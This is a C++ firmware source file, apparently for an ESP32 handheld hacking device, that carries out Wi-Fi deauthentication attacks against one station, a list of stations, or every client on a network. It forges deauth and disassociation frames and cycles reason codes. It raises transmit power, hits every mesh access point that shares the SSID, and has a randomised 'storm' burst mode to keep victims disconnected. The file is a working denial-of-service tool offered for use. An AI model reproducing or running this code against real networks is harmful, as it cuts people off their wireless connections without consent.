#include "deauther.h"
#include "clients.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/net_utils.h"
#include "core/utils.h"
#include "core/wifi/wifi_common.h"
#include "core/wifi/webInterface.h"
#include "scan_hosts.h"
#include "wifi_atks.h"
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <globals.h>
#include <iomanip>
#include <iostream>
#include <lwip/dns.h>
#include <lwip/err.h>
#include <lwip/etharp.h>
#include <lwip/igmp.h>
#include <lwip/inet.h>
#include <lwip/init.h>
#include <lwip/ip_addr.h>
#include <lwip/mem.h>
#include <lwip/memp.h>
#include <lwip/netif.h>
#include <lwip/sockets.h>
#include <lwip/sys.h>
#include <lwip/timeouts.h>
#include <modules/wifi/sniffer.h>
#include <sstream>

// Enhanced deauth reason codes - expanded for better effectiveness
static const uint8_t DEAUTH_REASONS[] = {
    0x01, // Unspecified
    0x04, // Disassociated due to inactivity
    0x06, // Class 2 frame received from non-authenticated STA
    0x07, // Class 3 frame received from non-associated STA
    0x08, // Disassociated because sending STA is leaving
    0x0A, // Requested by AP
    0x0D, // Invalid PMKID
    0x0F, // 4-way handshake timeout
    0x12, // Disassociated due to AP resource
    0x28  // SA Query timeout
};
static const int DEAUTH_REASON_COUNT = sizeof(DEAUTH_REASONS) / sizeof(DEAUTH_REASONS[0]);

// Global deauth state for burst control and adaptive behavior
static struct {
    uint8_t reason_index = 0;          // Current position in reason code rotation
    uint32_t burst_counter = 0;        // Total bursts sent since attack start
    bool storm_active = false;         // Storm mode flag for aggressive sending
    uint32_t last_burst_time = 0;      // Timestamp of last burst for timing control
    uint8_t consecutive_failures = 0;  // Track failures for adaptive delay
} deauth_state;

// Store all APs with same SSID for mesh network targeting
struct APInfo {
    uint8_t bssid[6];
    int channel;
};
static std::vector<APInfo> sameSSID_APs;

// Função para obter o MAC do gateway (ORIGINAL - DON'T CHANGE)
void getGatewayMAC(uint8_t gatewayMAC[6]) {
    wifi_ap_record_t ap_info;
    if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
        memcpy(gatewayMAC, ap_info.bssid, 6);
        Serial.print("Gateway MAC: ");
        Serial.println(macToString(gatewayMAC));
    } else {
        Serial.println("Erro ao obter informações do AP.");
    }
}

bool isMACZero(const uint8_t* mac) {
    for (int i = 0; i < 6; i++) {
        if (mac[i] != 0x00) return false;
    }
    return true;
}

bool macCompare(const uint8_t* mac1, const uint8_t* mac2) {
    for (int i = 0; i < 6; i++) {
        if (mac1[i] != mac2[i]) return false;
    }
    return true;
}

// Cache all APs with same SSID for mesh network targeting
void cacheSameSSIDAPs() {
    sameSSID_APs.clear();
    String currentSSID = WiFi.SSID();
    if (currentSSID.length() == 0) return;
    
    int n = WiFi.scanNetworks(false, false);
    for (int i = 0; i < n; i++) {
        if (WiFi.SSID(i) == currentSSID) {
            APInfo info;
            memcpy(info.bssid, WiFi.BSSID(i), 6);
            info.channel = WiFi.channel(i);
            sameSSID_APs.push_back(info);
        }
    }
    WiFi.scanDelete();
}

// Ensure WiFi is connected before proceeding
bool ensureWiFiConnected() {
    if (WiFi.status() == WL_CONNECTED) {
        return true;
    }
    
    drawMainBorderWithTitle("WiFi Required");
    padprintln("No WiFi connection detected.");
    padprintln("Scanning for networks...");
    tft.setTextSize(FP);
    tft.setCursor(10, 100);
    tft.print("Scanning...");
    
    int n = WiFi.scanNetworks();
    if (n == 0) {
        displayError("No networks found", true);
        return false;
    }
    
    std::vector<Option> networkOptions;
    for (int i = 0; i < n; ++i) {
        String ssid = WiFi.SSID(i);
        if (ssid.length() > 0 && ssid != "") {
            networkOptions.push_back({ssid.c_str(), [ssid]() {
                displayTextLine("Connecting to " + ssid + "...");
                WiFi.begin(ssid.c_str());
                int attempts = 0;
                while (WiFi.status() != WL_CONNECTED && attempts < 20) {
                    delay(500);
                    attempts++;
                    if (attempts % 2 == 0) {
                        displayTextLine("Connecting to " + ssid + " " + String(attempts * 500) + "ms");
                    }
                }
                if (WiFi.status() == WL_CONNECTED) {
                    displaySuccess("Connected to " + ssid);
                    delay(500);
                } else {
                    displayError("Failed to connect to " + ssid, true);
                }
            }});
        }
    }
    networkOptions.push_back({"Back", []() { returnToMenu = true; }});
    
    loopOptions(networkOptions, MENU_TYPE_SUBMENU, "Select WiFi");
    return (WiFi.status() == WL_CONNECTED);
}

// Enhanced channel detection with caching for speed
int getAPChannel(const uint8_t* target_bssid) {
    static wifi_ap_record_t cached_ap;
    static unsigned long cache_time = 0;
    static uint8_t cached_bssid[6] = {0};
    static int cached_channel = 0;
    
    // Check cache first
    if (cache_time > 0 && millis() - cache_time < 5000) {
        if (macCompare(cached_bssid, target_bssid)) {
            return cached_channel;
        }
    }
    
    int found_channel = 0;

    int numNetworks = WiFi.scanNetworks(false, false);

    for (int i = 0; i < numNetworks; i++) {
        uint8_t* bssid_ptr = WiFi.BSSID(i);

        if (macCompare(bssid_ptr, target_bssid)) {
            found_channel = WiFi.channel(i);
            break;
        }
    }

    WiFi.scanDelete();

    if (found_channel == 0) {
        found_channel = WiFi.channel();
        if (found_channel == 0) found_channel = 1;
    }
    
    // Update cache
    memcpy(cached_bssid, target_bssid, 6);
    cached_channel = found_channel;
    cache_time = millis();

    return found_channel;
}

// Enhanced monitor mode without full stack re-init
bool tryMonitorMode(uint8_t channel) {
    Serial.printf("[DEAUTH] Trying monitor mode on CH%d\n", channel);

    // Save current mode
    wifi_mode_t current_mode;
    esp_wifi_get_mode(&current_mode);

    // Stop and re-init only if necessary
    esp_wifi_stop();
    delay(5);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);

    esp_wifi_set_mode(WIFI_MODE_STA);

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL
    };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);

    esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        Serial.printf("[DEAUTH] Failed to set channel: %d\n", err);

        esp_wifi_set_promiscuous(false);
        esp_wifi_set_mode(current_mode);
        esp_wifi_start();
        return false;
    }

    esp_wifi_set_max_tx_power(78);

    Serial.printf("[DEAUTH] Using enhanced mode on CH%d\n", channel);
    return true;
}

// Build deauth frame with support for broadcast
void buildOptimizedDeauthFrame(uint8_t* frame, 
                              const uint8_t* dest,
                              const uint8_t* src,
                              const uint8_t* bssid,
                              uint8_t reason = 0x07,
                              bool is_disassoc = false) {
    frame[0] = is_disassoc ? 0xA0 : 0xC0;
    frame[1] = 0x00;

    frame[2] = 0x00;
    frame[3] = 0x00;

    memcpy(&frame[4], dest, 6);
    memcpy(&frame[10], src, 6);
    memcpy(&frame[16], bssid, 6);

    static uint16_t seq = 0;
    seq = random(0, 4096);
    frame[22] = (seq >> 4) & 0xFF;
    frame[23] = ((seq & 0x0F) << 4);

    frame[24] = reason;
    frame[25] = 0x00;
}

// Send frame with error handling
void sendDeauthFrame(const uint8_t* frame, bool enhanced_mode) {
    if (enhanced_mode) {
        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
        if (err != ESP_OK) {
            Serial.printf("[DEAUTH] TX failed: %d\n", err);
            deauth_state.consecutive_failures++;
        } else {
            deauth_state.consecutive_failures = 0;
        }
    } else {
        send_raw_frame(frame, 26);
    }
}

// Send burst of deauth frames
void sendDeauthBurst(uint8_t* frame1, uint8_t* frame2, uint8_t* frame3, uint8_t* frame4, bool enhanced_mode, uint8_t reason) {
    frame1[24] = reason;
    frame2[24] = reason;
    frame3[24] = reason;
    frame4[24] = reason;
    
    sendDeauthFrame(frame1, enhanced_mode);
    sendDeauthFrame(frame2, enhanced_mode);
    sendDeauthFrame(frame3, enhanced_mode);
    sendDeauthFrame(frame4, enhanced_mode);
}

void stationDeauth(Host host) {
    if (WiFi.status() != WL_CONNECTED) {
        // Try to connect first
        if (!ensureWiFiConnected()) {
            displayError("Not connected to WiFi", true);
            return;
        }
    }
    // Stop WebUI before setting WiFi mode for station deauth
    cleanlyStopWebUiForWiFiFeature();
    uint8_t targetMAC[6];

    uint8_t gatewayMAC[6];
    uint8_t victimIP[4];

    for (int i = 0; i < 4; i++) victimIP[i] = host.ip[i];

    stringToMAC(host.mac.c_str(), targetMAC);

    if (isMACZero(targetMAC)) {
        displayError("Invalid MAC address", true);
        return;
    }

    getGatewayMAC(gatewayMAC);

    if (isMACZero(gatewayMAC)) {
        displayError("Could not get gateway MAC", true);
        return;
    }

    int channel = getAPChannel(gatewayMAC);

    // Cache all APs with same SSID for mesh network targeting
    cacheSameSSIDAPs();
    bool useMultipleAPs = sameSSID_APs.size() > 1;
    if (useMultipleAPs) {
        Serial.printf("[DEAUTH] Found %d APs with same SSID for mesh targeting\n", sameSSID_APs.size());
    }

    bool enhanced_mode = tryMonitorMode(channel);

    if (!enhanced_mode) {
        wifiDisconnect();
        delay(10);
        WiFi.mode(WIFI_AP);

        String currentSsid = WiFi.SSID();
        if (currentSsid.length() == 0) {
            currentSsid = "DEAUTH_" + String(random(1000, 9999));
        }

        if (!WiFi.softAP(currentSsid.c_str(), emptyString, channel, 1, 4, false)) {
            Serial.println("Fail Starting AP Mode");
            displayError("Fail starting Deauth", true);
            return;
        }
    }

    uint8_t deauth_ap_to_sta[26];
    uint8_t disassoc_ap_to_sta[26];
    uint8_t deauth_sta_to_ap[26];
    uint8_t disassoc_sta_to_ap[26];
    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    buildOptimizedDeauthFrame(deauth_ap_to_sta, targetMAC, gatewayMAC, gatewayMAC, 0x07, false);
    buildOptimizedDeauthFrame(disassoc_ap_to_sta, targetMAC, gatewayMAC, gatewayMAC, 0x07, true);
    buildOptimizedDeauthFrame(deauth_sta_to_ap, gatewayMAC, targetMAC, gatewayMAC, 0x07, false);
    buildOptimizedDeauthFrame(disassoc_sta_to_ap, gatewayMAC, targetMAC, gatewayMAC, 0x07, true);

    drawMainBorderWithTitle("Station Deauth");
    tft.setTextSize(FP);
    padprintln("Trying to deauth one target.");
    padprintln("Tgt:" + host.mac);
    padprintln("Tgt: " + ipToString(victimIP));
    padprintln("GTW:" + macToString(gatewayMAC));
    padprintln("CH:" + String(channel));
    padprintln("Mode:" + String(enhanced_mode ? "Enhanced" : "AP"));
    if (useMultipleAPs) {
        padprintln("Mesh: " + String(sameSSID_APs.size()) + " APs");
    }
    padprintln("");
    padprintln("Press Any key to STOP.");

    long tmp = millis();
    int cont = 0;
    int total_frames = 0;
    uint8_t current_reason = 0;
    int ap_index = 0;
    
    // Reset deauth state for this attack
    deauth_state.reason_index = 0;
    deauth_state.burst_counter = 0;
    deauth_state.storm_active = false;
    deauth_state.last_burst_time = 0;
    deauth_state.consecutive_failures = 0;

    while (!check(AnyKeyPress)) {
        // Rotate through reason codes
        if (cont % 20 == 0) {
            deauth_state.reason_index = (deauth_state.reason_index + 1) % DEAUTH_REASON_COUNT;
            current_reason = DEAUTH_REASONS[deauth_state.reason_index];
        }

        // If multiple APs in mesh, cycle through them
        if (useMultipleAPs) {
            ap_index = (ap_index + 1) % sameSSID_APs.size();
            APInfo& current_ap = sameSSID_APs[ap_index];
            
            // Switch channel if needed
            if (enhanced_mode && current_ap.channel != channel) {
                esp_wifi_set_channel(current_ap.channel, WIFI_SECOND_CHAN_NONE);
            }
            
            // Build frames with this AP's BSSID
            buildOptimizedDeauthFrame(deauth_ap_to_sta, targetMAC, current_ap.bssid, current_ap.bssid, current_reason, false);
            buildOptimizedDeauthFrame(disassoc_ap_to_sta, targetMAC, current_ap.bssid, current_ap.bssid, current_reason, true);
            buildOptimizedDeauthFrame(deauth_sta_to_ap, current_ap.bssid, targetMAC, current_ap.bssid, current_reason, false);
            buildOptimizedDeauthFrame(disassoc_sta_to_ap, current_ap.bssid, targetMAC, current_ap.bssid, current_reason, true);
        }

        // Send standard 4-frame deauth
        sendDeauthBurst(deauth_ap_to_sta, disassoc_ap_to_sta, deauth_sta_to_ap, disassoc_sta_to_ap, enhanced_mode, current_reason);
        cont += 4;
        total_frames += 4;
        deauth_state.burst_counter++;

        // Send broadcast deauth every 5 frames
        if (cont % 5 == 0) {
            uint8_t broadcast_frame[26];
            uint8_t broadcast_reason = DEAUTH_REASONS[random(DEAUTH_REASON_COUNT)];
            if (useMultipleAPs) {
                APInfo& current_ap = sameSSID_APs[ap_index];
                buildOptimizedDeauthFrame(broadcast_frame, broadcast_mac, current_ap.bssid, current_ap.bssid, broadcast_reason, false);
            } else {
                buildOptimizedDeauthFrame(broadcast_frame, broadcast_mac, gatewayMAC, gatewayMAC, broadcast_reason, false);
            }
            sendDeauthFrame(broadcast_frame, enhanced_mode);
            total_frames++;
        }

        // Burst mode - send multiple frames rapidly every 50 frames
        if (cont % 50 == 0) {
            // Check if we should enter storm mode based on burst count
            if (deauth_state.burst_counter > 100 && random(100) < 30) {
                deauth_state.storm_active = true;
            }
            
            if (deauth_state.storm_active) {
                // Storm mode: send extra frames with minimal delay
                for (int burst = 0; burst < 10; burst++) {
                    uint8_t burst_reason = DEAUTH_REASONS[random(DEAUTH_REASON_COUNT)];
                    if (useMultipleAPs) {
                        // Use current AP for storm frames
                        APInfo& current_ap = sameSSID_APs[ap_index];
                        buildOptimizedDeauthFrame(deauth_ap_to_sta, targetMAC, current_ap.bssid, current_ap.bssid, burst_reason, false);
                        buildOptimizedDeauthFrame(disassoc_ap_to_sta, targetMAC, current_ap.bssid, current_ap.bssid, burst_reason, true);
                        buildOptimizedDeauthFrame(deauth_sta_to_ap, current_ap.bssid, targetMAC, current_ap.bssid, burst_reason, false);
                        buildOptimizedDeauthFrame(disassoc_sta_to_ap, current_ap.bssid, targetMAC, current_ap.bssid, burst_reason, true);
                    }
                    sendDeauthBurst(deauth_ap_to_sta, disassoc_ap_to_sta, deauth_sta_to_ap, disassoc_sta_to_ap, enhanced_mode, burst_reason);
                    total_frames += 4;
                    deauth_state.burst_counter++;
                    delay(1);
                }
                deauth_state.last_burst_time = millis();
                
                // Randomly exit storm mode
                if (random(100) < 20) {
                    deauth_state.storm_active = false;
                }
            } else {
                // Normal burst
                for (int burst = 0; burst < 5; burst++) {
                    uint8_t burst_reason = DEAUTH_REASONS[random(DEAUTH_REASON_COUNT)];
                    if (useMultipleAPs) {
                        APInfo& current_ap = sameSSID_APs[ap_index];
                        buildOptimizedDeauthFrame(deauth_ap_to_sta, targetMAC, current_ap.bssid, current_ap.bssid, burst_reason, false);
                        buildOptimizedDeauthFrame(disassoc_ap_to_sta, targetMAC, current_ap.bssid, current_ap.bssid, burst_reason, true);
                        buildOptimizedDeauthFrame(deauth_sta_to_ap, current_ap.bssid, targetMAC, current_ap.bssid, burst_reason, false);
                        buildOptimizedDeauthFrame(disassoc_sta_to_ap, current_ap.bssid, targetMAC, current_ap.bssid, burst_reason, true);
                    }
                    sendDeauthBurst(deauth_ap_to_sta, disassoc_ap_to_sta, deauth_sta_to_ap, disassoc_sta_to_ap, enhanced_mode, burst_reason);
                    total_frames += 4;
                    deauth_state.burst_counter++;
                    delay(1);
                }
            }
        }

        // Adaptive delay based on storm state and failures
        int delay_ms;
        if (deauth_state.storm_active) {
            delay_ms = random(1, 3);  // Very fast in storm mode
        } else if (deauth_state.consecutive_failures > 5) {
            delay_ms = random(5, 15);  // Slow down if having issues
            deauth_state.consecutive_failures = 0;
        } else {
            delay_ms = random(2, 8);
        }
        delay(delay_ms);

        if (millis() - tmp > 1000) {
            int fps = cont;
            cont = 0;
            tmp = millis();

            tft.fillRect(tftWidth - 100, tftHeight - 40, 100, 40, TFT_BLACK);
            tft.drawRightString(String(fps) + " fps", tftWidth - 12, tftHeight - 36, 1);
            tft.drawRightString("Total: " + String(total_frames), tftWidth - 12, tftHeight - 20, 1);
            
            // Show storm status if active
            if (deauth_state.storm_active) {
                tft.drawRightString("STORM", tftWidth - 12, tftHeight - 56, 1);
            }
        }
    }

    if (enhanced_mode) {
        esp_wifi_set_promiscuous(false);
    }

    wifiDisconnect();
    WiFi.mode(WIFI_STA);

    tft.fillRect(0, tftHeight - 60, tftWidth, 60, TFT_BLACK);
    padprintln("Attack stopped.");
    padprintln("Frames sent: " + String(total_frames));
    padprintln("Bursts: " + String(deauth_state.burst_counter));
    delay(1000);
}

// Deauth all clients on the network
void deauthAll() {
    if (WiFi.status() != WL_CONNECTED) {
        if (!ensureWiFiConnected()) {
            displayError("Not connected to WiFi", true);
            return;
        }
    }
    
    cleanlyStopWebUiForWiFiFeature();
    
    uint8_t gatewayMAC[6];
    getGatewayMAC(gatewayMAC);
    
    if (isMACZero(gatewayMAC)) {
        displayError("Could not get gateway MAC", true);
        return;
    }
    
    int channel = getAPChannel(gatewayMAC);
    
    // Cache all APs with same SSID for mesh network targeting
    cacheSameSSIDAPs();
    bool useMultipleAPs = sameSSID_APs.size() > 1;
    if (useMultipleAPs) {
        Serial.printf("[DEAUTH] Found %d APs with same SSID for mesh targeting\n", sameSSID_APs.size());
    }
    
    bool enhanced_mode = tryMonitorMode(channel);
    
    if (!enhanced_mode) {
        wifiDisconnect();
        delay(10);
        WiFi.mode(WIFI_AP);
        if (!WiFi.softAP("DEAUTH_ALL", emptyString, channel, 1, 4, false)) {
            displayError("Failed to start Deauth", true);
            return;
        }
    }
    
    drawMainBorderWithTitle("Deauth All");
    tft.setTextSize(FP);
    padprintln("Deauthing all clients...");
    padprintln("Channel: " + String(channel));
    padprintln("Mode: " + String(enhanced_mode ? "Enhanced" : "AP"));
    if (useMultipleAPs) {
        padprintln("Mesh: " + String(sameSSID_APs.size()) + " APs");
    }
    padprintln("");
    padprintln("Press ANY key to STOP.");
    
    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t frame[26];
    uint32_t start_time = millis();
    int total_frames = 0;
    int ap_index = 0;
    
    // Reset deauth state for this attack
    deauth_state.reason_index = 0;
    deauth_state.burst_counter = 0;
    deauth_state.storm_active = false;
    deauth_state.last_burst_time = 0;
    deauth_state.consecutive_failures = 0;
    
    while (!check(AnyKeyPress)) {
        // Rotate through reason codes
        if (total_frames % 20 == 0) {
            deauth_state.reason_index = (deauth_state.reason_index + 1) % DEAUTH_REASON_COUNT;
        }
        
        uint8_t reason = DEAUTH_REASONS[deauth_state.reason_index];
        
        // If multiple APs in mesh, cycle through them
        if (useMultipleAPs) {
            ap_index = (ap_index + 1) % sameSSID_APs.size();
            APInfo& current_ap = sameSSID_APs[ap_index];
            
            if (enhanced_mode && current_ap.channel != channel) {
                esp_wifi_set_channel(current_ap.channel, WIFI_SECOND_CHAN_NONE);
            }
            
            buildOptimizedDeauthFrame(frame, broadcast_mac, current_ap.bssid, current_ap.bssid, reason, false);
        } else {
            buildOptimizedDeauthFrame(frame, broadcast_mac, gatewayMAC, gatewayMAC, reason, false);
        }
        
        sendDeauthFrame(frame, enhanced_mode);
        total_frames++;
        deauth_state.burst_counter++;
        
        // Storm mode activation
        if (total_frames % 100 == 0 && random(100) < 40) {
            deauth_state.storm_active = true;
        }
        
        int delay_ms;
        if (deauth_state.storm_active) {
            delay_ms = random(1, 3);
            // Send extra frames in storm mode
            if (random(100) < 30) {
                uint8_t extra_reason = DEAUTH_REASONS[random(DEAUTH_REASON_COUNT)];
                if (useMultipleAPs) {
                    APInfo& current_ap = sameSSID_APs[ap_index];
                    buildOptimizedDeauthFrame(frame, broadcast_mac, current_ap.bssid, current_ap.bssid, extra_reason, false);
                } else {
                    buildOptimizedDeauthFrame(frame, broadcast_mac, gatewayMAC, gatewayMAC, extra_reason, false);
                }
                sendDeauthFrame(frame, enhanced_mode);
                total_frames++;
                deauth_state.burst_counter++;
            }
            // Randomly exit storm mode
            if (random(100) < 10) {
                deauth_state.storm_active = false;
            }
        } else {
            delay_ms = random(5, 15);
        }
        
        delay(delay_ms);
        
        // Update display
        if (millis() - start_time > 2000) {
            start_time = millis();
            tft.fillRect(tftWidth - 100, tftHeight - 40, 100, 40, TFT_BLACK);
            tft.drawRightString("FPS: " + String(total_frames / 2), tftWidth - 12, tftHeight - 36, 1);
            tft.drawRightString("Total: " + String(total_frames), tftWidth - 12, tftHeight - 20, 1);
            
            if (deauth_state.storm_active) {
                tft.drawRightString("STORM", tftWidth - 12, tftHeight - 56, 1);
            }
        }
    }
    
    if (enhanced_mode) {
        esp_wifi_set_promiscuous(false);
    }
    
    wifiDisconnect();
    WiFi.mode(WIFI_STA);
    delay(500);
    
    tft.fillRect(0, tftHeight - 60, tftWidth, 60, TFT_BLACK);
    padprintln("Attack stopped.");
    padprintln("Frames sent: " + String(total_frames));
    padprintln("Bursts: " + String(deauth_state.burst_counter));
    delay(1500);
}

// Deauth multiple targets from a list
void deauthTargetList(const std::vector<Host>& targets) {
    if (targets.empty()) {
        displayError("No targets selected", true);
        return;
    }
    
    if (WiFi.status() != WL_CONNECTED) {
        if (!ensureWiFiConnected()) {
            displayError("Not connected to WiFi", true);
            return;
        }
    }
    
    cleanlyStopWebUiForWiFiFeature();
    
    uint8_t gatewayMAC[6];
    getGatewayMAC(gatewayMAC);
    
    if (isMACZero(gatewayMAC)) {
        displayError("Could not get gateway MAC", true);
        return;
    }
    
    int channel = getAPChannel(gatewayMAC);
    
    // Cache all APs with same SSID for mesh network targeting
    cacheSameSSIDAPs();
    bool useMultipleAPs = sameSSID_APs.size() > 1;
    if (useMultipleAPs) {
        Serial.printf("[DEAUTH] Found %d APs with same SSID for mesh targeting\n", sameSSID_APs.size());
    }
    
    bool enhanced_mode = tryMonitorMode(channel);
    
    if (!enhanced_mode) {
        wifiDisconnect();
        delay(10);
        WiFi.mode(WIFI_AP);
        if (!WiFi.softAP("DEAUTH_LIST", emptyString, channel, 1, 4, false)) {
            displayError("Failed to start Deauth", true);
            return;
        }
    }
    
    drawMainBorderWithTitle("Deauth List");
    tft.setTextSize(FP);
    padprintln("Deauthing " + String(targets.size()) + " targets...");
    padprintln("Channel: " + String(channel));
    padprintln("Mode: " + String(enhanced_mode ? "Enhanced" : "AP"));
    if (useMultipleAPs) {
        padprintln("Mesh: " + String(sameSSID_APs.size()) + " APs");
    }
    padprintln("");
    padprintln("Press ANY key to STOP.");
    
    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint32_t start_time = millis();
    int total_frames = 0;
    size_t target_index = 0;
    int ap_index = 0;
    
    // Reset deauth state
    deauth_state.reason_index = 0;
    deauth_state.burst_counter = 0;
    deauth_state.storm_active = false;
    deauth_state.last_burst_time = 0;
    deauth_state.consecutive_failures = 0;
    
    while (!check(AnyKeyPress)) {
        // Cycle through targets
        if (target_index >= targets.size()) {
            target_index = 0;
        }
        
        const Host& host = targets[target_index];
        uint8_t targetMAC[6];
        stringToMAC(host.mac.c_str(), targetMAC);
        
        if (!isMACZero(targetMAC)) {
            uint8_t frames[4][26];
            uint8_t reason = DEAUTH_REASONS[random(DEAUTH_REASON_COUNT)];
            
            // If multiple APs in mesh, cycle through them
            if (useMultipleAPs) {
                ap_index = (ap_index + 1) % sameSSID_APs.size();
                APInfo& current_ap = sameSSID_APs[ap_index];
                
                if (enhanced_mode && current_ap.channel != channel) {
                    esp_wifi_set_channel(current_ap.channel, WIFI_SECOND_CHAN_NONE);
                }
                
                buildOptimizedDeauthFrame(frames[0], targetMAC, current_ap.bssid, current_ap.bssid, reason, false);
                buildOptimizedDeauthFrame(frames[1], targetMAC, current_ap.bssid, current_ap.bssid, reason, true);
                buildOptimizedDeauthFrame(frames[2], current_ap.bssid, targetMAC, current_ap.bssid, reason, false);
                buildOptimizedDeauthFrame(frames[3], current_ap.bssid, targetMAC, current_ap.bssid, reason, true);
            } else {
                buildOptimizedDeauthFrame(frames[0], targetMAC, gatewayMAC, gatewayMAC, reason, false);
                buildOptimizedDeauthFrame(frames[1], targetMAC, gatewayMAC, gatewayMAC, reason, true);
                buildOptimizedDeauthFrame(frames[2], gatewayMAC, targetMAC, gatewayMAC, reason, false);
                buildOptimizedDeauthFrame(frames[3], gatewayMAC, targetMAC, gatewayMAC, reason, true);
            }
            
            for (int i = 0; i < 4; i++) {
                sendDeauthFrame(frames[i], enhanced_mode);
                total_frames++;
                deauth_state.burst_counter++;
            }
        }
        
        target_index++;
        
        // Adaptive delay
        if (deauth_state.storm_active) {
            delay(random(1, 3));
        } else {
            delay(random(1, 5));
        }
        
        // Update display
        if (millis() - start_time > 2000) {
            start_time = millis();
            tft.fillRect(tftWidth - 100, tftHeight - 40, 100, 40, TFT_BLACK);
            tft.drawRightString("Total: " + String(total_frames), tftWidth - 12, tftHeight - 20, 1);
        }
    }
    
    if (enhanced_mode) {
        esp_wifi_set_promiscuous(false);
    }
    
    wifiDisconnect();
    WiFi.mode(WIFI_STA);
    delay(500);
    
    tft.fillRect(0, tftHeight - 60, tftWidth, 60, TFT_BLACK);
    padprintln("Attack stopped.");
    padprintln("Frames sent: " + String(total_frames));
    padprintln("Bursts: " + String(deauth_state.burst_counter));
    delay(1000);
}
